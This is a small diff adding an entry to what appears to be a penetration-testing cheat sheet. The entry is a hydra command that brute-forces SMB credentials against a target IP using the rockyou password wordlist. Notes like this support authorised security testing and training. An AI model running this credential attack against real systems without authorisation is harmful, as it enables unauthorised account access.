@@ -1,1 +1,3 @@
-
+SMB:
+Bruteforce SMB credentials
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb
